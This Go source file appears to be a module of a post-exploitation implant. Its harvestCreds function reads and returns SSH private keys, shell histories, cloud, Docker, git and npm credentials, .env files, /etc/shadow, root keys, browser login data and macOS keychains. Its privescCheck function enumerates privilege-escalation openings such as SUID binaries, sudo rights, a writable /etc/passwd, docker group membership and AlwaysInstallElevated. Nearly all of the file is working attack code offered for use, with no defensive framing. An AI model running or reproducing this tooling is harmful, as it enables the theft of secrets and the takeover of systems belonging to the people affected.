package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

// harvestCreds searches the filesystem for credential material.
// Targets: SSH keys, bash/zsh history, .env files, AWS/GCP/Azure credentials,
// browser-stored credentials, netrc, git credentials, Docker credentials.
func harvestCreds() (string, string) {
	home, _ := os.UserHomeDir()
	var findings []string

	targets := credTargets(home)

	for _, t := range targets {
		paths, err := filepath.Glob(t.glob)
		if err != nil || len(paths) == 0 {
			continue
		}
		for _, p := range paths {
			info, err := os.Stat(p)
			if err != nil || info.IsDir() {
				continue
			}
			if info.Size() > 512*1024 { // skip files >512KB
				findings = append(findings, fmt.Sprintf("[SKIP too large] %s", p))
				continue
			}
			data, err := os.ReadFile(p)
			if err != nil {
				continue
			}
			content := string(data)
			// Only return if it looks interesting
			if t.filter != "" && !strings.Contains(strings.ToLower(content), t.filter) {
				continue
			}
			preview := content
			if len(preview) > 800 {
				preview = preview[:800] + "\n... [truncated]"
			}
			findings = append(findings, fmt.Sprintf(
				"\n══════ %s [%s] ══════\n%s", p, t.category, preview,
			))
		}
	}

	if len(findings) == 0 {
		return "No credential files found.", "completed"
	}
	return strings.Join(findings, "\n"), "completed"
}

type credTarget struct {
	glob     string
	category string
	filter   string // if set, file must contain this substring (lowercased)
}

func credTargets(home string) []credTarget {
	t := []credTarget{
		// SSH private keys
		{glob: home + "/.ssh/id_*", category: "SSH_KEY", filter: ""},
		{glob: home + "/.ssh/id_rsa", category: "SSH_KEY", filter: ""},
		{glob: home + "/.ssh/id_ed25519", category: "SSH_KEY", filter: ""},
		{glob: home + "/.ssh/known_hosts", category: "SSH_KNOWN_HOSTS", filter: ""},

		// Shell histories
		{glob: home + "/.bash_history", category: "BASH_HISTORY", filter: ""},
		{glob: home + "/.zsh_history", category: "ZSH_HISTORY", filter: ""},
		{glob: home + "/.sh_history", category: "SH_HISTORY", filter: ""},

		// AWS
		{glob: home + "/.aws/credentials", category: "AWS_CREDS", filter: ""},
		{glob: home + "/.aws/config", category: "AWS_CONFIG", filter: ""},

		// GCP
		{glob: home + "/.config/gcloud/credentials.db", category: "GCP_CREDS", filter: ""},
		{glob: home + "/.config/gcloud/application_default_credentials.json", category: "GCP_ADC", filter: ""},

		// Azure
		{glob: home + "/.azure/accessTokens.json", category: "AZURE_TOKENS", filter: ""},
		{glob: home + "/.azure/azureProfile.json", category: "AZURE_PROFILE", filter: ""},

		// Docker
		{glob: home + "/.docker/config.json", category: "DOCKER_CONFIG", filter: "auth"},

		// Git credentials
		{glob: home + "/.gitconfig", category: "GIT_CONFIG", filter: ""},
		{glob: home + "/.git-credentials", category: "GIT_CREDS", filter: ""},
		{glob: home + "/.netrc", category: "NETRC", filter: ""},

		// .env files in common project locations
		{glob: home + "/**/.env", category: "DOTENV", filter: ""},
		{glob: "/var/www/**/.env", category: "DOTENV_WEB", filter: ""},
		{glob: "/opt/**/.env", category: "DOTENV_OPT", filter: ""},

		// Private keys anywhere in home
		{glob: home + "/**/*.pem", category: "PEM_KEY", filter: "private"},
		{glob: home + "/**/*.key", category: "PRIVATE_KEY", filter: "private"},

		// Kubernetes
		{glob: home + "/.kube/config", category: "KUBE_CONFIG", filter: ""},

		// Terraform
		{glob: home + "/**/.terraform/**/*.tfvars", category: "TF_VARS", filter: ""},

		// NPM
		{glob: home + "/.npmrc", category: "NPM_RC", filter: "_authtoken"},
	}

	if runtime.GOOS == "linux" {
		t = append(t,
			credTarget{glob: "/etc/shadow", category: "SHADOW", filter: ""},
			credTarget{glob: "/etc/passwd", category: "PASSWD", filter: ""},
			credTarget{glob: "/root/.ssh/id_*", category: "ROOT_SSH_KEY", filter: ""},
			credTarget{glob: "/root/.bash_history", category: "ROOT_BASH_HISTORY", filter: ""},
		)
	}

	if runtime.GOOS == "darwin" {
		t = append(t,
			// Chrome/Brave cookies path (for reference only — locked by OS)
			credTarget{
				glob:     home + "/Library/Application Support/Google/Chrome/Default/Login Data",
				category: "CHROME_LOGIN_DATA",
				filter:   "",
			},
			credTarget{
				glob:     home + "/Library/Keychains/*.keychain-db",
				category: "KEYCHAIN",
				filter:   "",
			},
		)
	}

	return t
}

// privescCheck enumerates local privilege escalation vectors.
func privescCheck() (string, string) {
	var findings []string

	switch runtime.GOOS {
	case "linux", "darwin":
		// sudo permissions
		out, _ := executeShell("sudo -l 2>/dev/null")
		if out != "" {
			findings = append(findings, fmt.Sprintf("[SUDO]\n%s", out))
		}
		// SUID binaries
		suid, _ := executeShell("find / -perm -4000 -type f 2>/dev/null | head -30")
		if suid != "" {
			findings = append(findings, fmt.Sprintf("[SUID BINARIES]\n%s", suid))
		}
		// World-writable cron
		cron, _ := executeShell("ls -la /etc/cron* /var/spool/cron* 2>/dev/null | head -20")
		if cron != "" {
			findings = append(findings, fmt.Sprintf("[CRON DIRS]\n%s", cron))
		}
		// Writable /etc/passwd
		_, err := os.OpenFile("/etc/passwd", os.O_WRONLY|os.O_APPEND, 0)
		if err == nil {
			findings = append(findings, "[!!!] /etc/passwd is WRITABLE — can add root user")
		}
		// Current user privileges
		id, _ := executeShell("id")
		findings = append(findings, fmt.Sprintf("[CURRENT USER]\n%s", id))
		// PATH hijack opportunities
		pathOut, _ := executeShell("echo $PATH")
		findings = append(findings, fmt.Sprintf("[PATH]\n%s", strings.TrimSpace(pathOut)))
		// Capabilities
		caps, _ := executeShell("getcap -r / 2>/dev/null | head -20")
		if caps != "" {
			findings = append(findings, fmt.Sprintf("[CAPABILITIES]\n%s", caps))
		}
		// NFS no_root_squash
		nfs, _ := executeShell("cat /etc/exports 2>/dev/null")
		if strings.Contains(nfs, "no_root_squash") {
			findings = append(findings, fmt.Sprintf("[NFS no_root_squash]\n%s", nfs))
		}
		// Docker group
		groups, _ := executeShell("groups 2>/dev/null")
		if strings.Contains(groups, "docker") {
			findings = append(findings, "[!!!] User is in DOCKER group — container escape possible")
		}

	case "windows":
		// Token privileges
		privs, _ := executeShell("whoami /priv")
		findings = append(findings, fmt.Sprintf("[TOKEN PRIVILEGES]\n%s", privs))
		// Groups
		groups, _ := executeShell("whoami /groups")
		findings = append(findings, fmt.Sprintf("[GROUPS]\n%s", groups))
		// UAC level
		uac, _ := executeShell(`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA 2>nul`)
		findings = append(findings, fmt.Sprintf("[UAC]\n%s", uac))
		// AlwaysInstallElevated
		aie, _ := executeShell(`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul`)
		if strings.Contains(aie, "0x1") {
			findings = append(findings, "[!!!] AlwaysInstallElevated is ENABLED — MSI privesc possible")
		}
		// Unquoted service paths
		svc, _ := executeShell(`wmic service get PathName 2>nul | findstr /i /v "c:\windows"`)
		if svc != "" {
			findings = append(findings, fmt.Sprintf("[SERVICE PATHS]\n%s", svc))
		}
	}

	if len(findings) == 0 {
		return "No obvious privesc vectors found.", "completed"
	}
	return strings.Join(findings, "\n\n"), "completed"
}
